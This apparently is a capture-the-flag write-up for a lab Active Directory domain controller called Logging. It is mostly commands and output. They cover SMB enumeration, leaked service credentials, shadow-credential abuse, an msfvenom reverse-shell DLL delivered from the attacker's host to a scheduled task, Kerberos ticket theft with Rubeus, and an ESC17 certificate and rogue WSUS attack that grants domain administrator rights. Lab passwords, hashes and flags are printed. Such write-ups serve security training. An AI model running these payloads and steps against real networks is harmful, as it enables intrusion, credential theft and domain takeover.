
## CTF Writeup: Logging

---
## Credentials

```
wallace.everette:Welcome2026@
```
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.56.45  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 12:54 -0500
Nmap scan report for 10.129.56.45
Host is up (0.018s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-14 00:54:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-14T00:55:57+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-14T00:55:56+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
|_ssl-date: 2026-08-14T00:55:57+00:00; +7h00m03s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-14T00:55:56+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
8531/tcp  open  ssl/unknown
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-08-14T00:55:56+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.logging.htb
| Not valid before: 2026-04-24T15:49:07
|_Not valid after:  2027-04-24T15:49:07
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49693/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49753/tcp open  msrpc         Microsoft Windows RPC
49793/tcp open  msrpc         Microsoft Windows RPC
49799/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-14T00:55:49
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.46 seconds
```

The target seems to be an Domain Controller. The TCP Scan reveals an webserver running on port 80 and on port 8530 & https running 8531. The Scan also reveals information about the Hostname: DC01, the target domain logging.htb & the FQDN of the Domain Controller dc01.logging.htb. Let's map all of this information to the target ip address in our local dns file.

Let's first enumerate SMB Shares using the provided credentials.

```
echo "10.129.56.45 dc01.logging.htb logging.htb dc01" | tee -a /etc/hosts
```

Enumerated SMB Shares & identifed an non-default SMB Share called "Logs" for which I have read permissions.

```
nxc smb logging.htb -u 'wallace.everette' -p 'Welcome2026@' --shares
```

Connected to the SMB Share & downloaded all information.

```
smbclient \\\\logging.htb/Logs -U wallace.everette
```

Retrieved credentials from an "IdentitySync_Trace_20260219.log"

```
svc_recovery:Em3rg3ncyPa$$2025
```

Trying to authenticate with this service account, gave us the server response that the account seems to be restricted.

```
nxc smb logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2025'
```

Enumerated domain users.

```
nxc smb logging.htb -u wallace.everette -p 'Welcome2026@' --rid-brute > newusers.txt
```

Formatted the output and stored it inside an users.txt for future bruteforce purposes.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Sprayed users, the service account and the Administrator Account seems to be restricted! STATUS_ACCOUNT_RESTRICTION. This status is returned when the credentials themselves are not the problem, but a policy prevents the logon method from being used, and the classic cause on a domain controller is membership in the Protected Users Group. Members of that Group are barred from NTLM Authentication and can only authenticate over Kerberos. We can confirm the membership directly with our wallace account.

```
nxc ldap logging.htb -u wallace.everette -p 'Welcome2026@' --groups "Protected Users"
```

Let's request an TGT.

```
impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2025'@10.129.56.45
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
```

This didn't work, let's try the same password, but for 2026!

```
impacket-getTGT logging.htb/svc_recovery@10.129.56.45
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in svc_recovery@10.129.56.45.ccache
```

It worked we gained an kerberos ticket for the service account.

Let's proceed with downloading domain information.

```
bloodhound-python -u wallace.everette -p 'Welcome2026@' -ns 10.129.56.45 -d logging.htb -c all
```

Uploaded Domain Information onto BloodHound and marked my user's as owned. 

Marked svc_recovery as owned & found out that he has GenericWrite ACL on MSA_HEALTH$. 

Let's abuse it! 

```
bloodyad --host dc01.logging.htb -d logging.htb -u svc_recovery -k add shadowCredentials msa_health$
[+] KeyCredential generated with following sha256 of RSA key: 63a9f144bb20f16d4e54b32a58a99de37ba59088390949aa720b67c4d1c95d12
[+] TGT stored in ccache file msa_health_2k.ccache

NT: 603fc24ee01a9409f83c9d1d701485c5
```

```
msa_health$:603fc24ee01a9409f83c9d1d701485c5
```

Checked if we can access the Domain Controller via WinRM & we can!

```
nxc winrm logging.htb -u 'msa_health$' -H 603fc24ee01a9409f83c9d1d701485c5
```

Connected to the Domain Controller.

```
evil-winrm -i dc01.logging.htb -u 'msa_health$' -H 603fc24ee01a9409f83c9d1d701485c5
```

Identified an interesting "monitor.ps1" script in C:\Users\ms_health$\Documents. 

Enumerated Permissions & found out we can modify the script!

```
icacls C:\Users\msa_health$\Documents\monitor.ps1
```

Reading the Task reveals the following information:

```
Get-Content "C:\Windows\System32\Tasks\UpdateChecker Agent"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2026-04-16T16:39:34.3280175</Date>
    <Author>logging\Administrator</Author>
    <URI>\UpdateChecker Agent</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT3M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2026-04-16T16:38:15.0311423</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>LeastPrivilege</RunLevel>
      <UserId>LOGGING\jaylee.clifton</UserId>
      <LogonType>Password</LogonType>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"C:\Program Files\UpdateMonitor\UpdateMonitor.exe"</Command>
      <Arguments>500 /scan=3 /autofix=true</Arguments>
    </Exec>
  </Actions>
</Task>
```

This tells us about an .exe file getting executed every 3mins C:\Program Files\UpdateMonitor\UpdateMonitor.exe by the Domain Admin "jaylee.clifton".

Further Enumeration of the scheduled task provided a target for privilege escalation:

```
Get-Content "C:\ProgramData\UpdateMonitor\Logs\monitor.log"
```

The .log file shows failures to load settings_update.dll and repeatedly reported that Settings_Update.zip was missing.

Started up netcat listener on my local machine.

```
rlwrap nc -lvnp 445
```

Create malicious "settings_update.dll" file using msfvenom.

```
msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.14.57 LPORT=445 --platform windows -f dll -o settings_update.dll
```

Created the .zip file.

```
zip Settings_Update.zip settings_update.dll
```

Started up python3 webserver on my local machine in the directory in which the .dll file is stored.

```
python3 -m http.server 80
```

Navigated to the path in which the .zip file fails to execute & transfered the .zip file there.

```
iwr -uri http://10.10.14.57/Settings_Update.zip -OutFile Settings_Update.zip
```

Gave everyone executable permissions for the .zip file.

```
icacls Settings_Update.zip /grant Everyone:F
```

Gained RCE as jaylee.clifton.

```
rlwrap nc -lvnp 445 
listening on [any] 445 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.56.45] 52783
Microsoft Windows [Version 10.0.17763.8644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Retrieved user.txt in C:\Users\Administrator\Desktop.

```
99d8890f7724a7fc32562d94dbe3857f
```
## Privilege Escalation

Let's perform persistence for this Tier Zero User.

Transfered Rubeus.exe for this.

```
certutil -urlcache -split -f http://10.10.14.57/Rubeus.exe Rubeus.exe
```

Gained base64 encoded tgt.

```
Rubeus.exe tgtdeleg /nowrap
```

Saved the base64 encoded ticket inside an jaylee.clifton.kirbi.b64 on my local machine

Decoded the ticket and stored the raw value inside an jaylee.clifton.kirbi file.

```
cat jaylee.clifton.kirbi.b64 | base64 -d > jaylee.clifton.kirbi
```

Let's now utilize ticketConverter to get an .ccache file

```
impacket-ticketConverter jaylee.clifton.kirbi jaylee.clifton.ccache
```

Exported the .ccache ticket inside our local kerberos cache.

```
export KRB5CCNAME=$(pwd)/jaylee.clifton.ccache
```

I then decided to enumerate ADCS Vulnerabilities as user jaylee.clifton.

```
certipy-ad find  -dc-ip 10.129.56.45 -target DC01.logging.htb -k -vulnerable -stdout
```

Identified that our current user can perform an ESC17 Attack for the UpdateSrv Template.

```
[+] User Enrollable Principals      : LOGGING.HTB\IT
    [!] Vulnerabilities
      ESC17                             : Enrollee supplies subject and template allows server authentication.
```
## ESC17

The previous phase concluded with the discovery that the UpdateSrv certificate template is vulnerable to ESC17. It's an Active Directory Certificate Services (AD CS) misconfiguration classification. It occurs when a certificate template allows low-privileged users to request server authentication certificates with an enrollee-supplied Subject Alternative Name (SAN), which attackers can combine with weak DNS access controls to intercept secure traffic like HTTPS-enabled WSUS clients. 

**Prerequisites**:

```
- Members of the IT group are permitted to enroll.
- The requester is allowed to specify the certificate subject.
- Certificates are issued automatically without approval.
- The template supports Server Authentication.
```

Found an interesting .html file in C:\Users\jaylee.clifton\Documents\Tickets which revealed an interesting internal target "wsus.logging.htb" endpoint, WSUS Stands for Windows Server Update Services deployment that trusts certificates issued through the vulnerable template. Also information about that the dns isn't even set for this endpoint & that he created an scheduled task "ForceSync" which runs every 120 seconds.

1. Using the Kerberos credential cache previously extracted from jaylee.clifton, BloodyAD is used to enumerate writable Active Directory objects:

```
KRB5CCNAME=jaylee.clifton.ccache bloodyad --host DC01.logging.htb -d logging.htb -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=logging,DC=htb
permission: WRITE

distinguishedName: CN=jaylee.clifton,CN=Users,DC=logging,DC=htb
permission: WRITE

distinguishedName: DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.logging.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD
```

The CREATE_CHILD permission over the DNS zone allows new DNS records to be created.

2. Create new DNS Record

```
KRB5CCNAME=jaylee.clifton.ccache bloodyAD --host DC01.logging.htb -d logging.htb -k add dnsRecord 'wsus' 10.10.14.57
```

or with

```
python3 /opt/arsenal/krbrelayx/dnstool.py -u 'logging.htb\wallace.everette' -p 'Welcome2026@' 10.129.56.45 -a add -r wsus.logging.htb -d 10.10.14.57
```

3. Now in order to view web traffic and the reverse-callback we just need to request an certificate! Since we identified previously that we can request an certificate with our user for the Correct Template, let's do it.

```
KRB5CCNAME=jaylee.clifton.ccache certipy-ad req -u jaylee.clifton -k -dc-ip 10.129.56.45 -target DC01.logging.htb -ca logging-DC01-CA -template UpdateSrv -dns wsus.logging.htb
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with DNS Host Name 'wsus.logging.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'wsus.pfx'
[*] Wrote certificate and private key to 'wsus.pfx'
```

4. Since the exploitation tool expects a PEM-formatted certificate, the PFX file is converted using OpenSSL:

```
openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:
```

The resulting wsus.pem file contains both the certificate and its associated private key.

This certificate will allow the attacker’s server to impersonate the legitimate WSUS server during TLS communication.
##### Installing WSUKS

- To perform the WSUS man-in-the-middle attack, the WSUKS tool is installed.

5. A dedicated Python virtual environment is created:

```
python -m venv myenv
```

6. Activate the environment

```
source myenv/bin/activate
```

7. Install the required dependencies:

```
sudo apt install pipx python3-nftables
```

8. Ensure the user’s local binaries are available:

```
pipx ensurepath
```

9. Install WSUKS:

```
pipx install wsuks --system-site-packages
```

10. Finally, create a symbolic link so the executable is available system-wide:

```
sudo ln -s ~/.local/bin/wsuks /usr/sbin/wsuks
```

11. Launching the Rogue WSUS Server

- The objective is simple. When the Domain Controller contacts what it believes is the legitimate WSUS server, it should instead connect to the attacker’s server.
- Rather than distributing a software update, WSUKS is instructed to execute a command that adds wallace.everette to the local Administrators group.
- The rogue WSUS server is started:

```
sudo wsuks -t DC01.logging.htb --WSUS-Server wsus.logging.htb --tls-cert wsus.pem -I tun0 --serve-only -c '/accepteula /s cmd /k "net localgroup administrators /add wallace.everette"'
```

12. Verifying Admin Access.

```
nxc smb DC01.logging.htb -u wallace.everette -p 'Welcome2026@'
SMB         10.129.56.45    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.56.45    445    DC01             [+] logging.htb\wallace.everette:Welcome2026@ (Pwn3d!)
```

Connected to the DC.

```
impacket-psexec wallace.everette:'Welcome2026@'@dc01.logging.htb
```

Retrieved root.txt in C:\Users\toby.brynleigh\Desktop.

```
a97c7deae056d19f92b97c4026ae48d0
```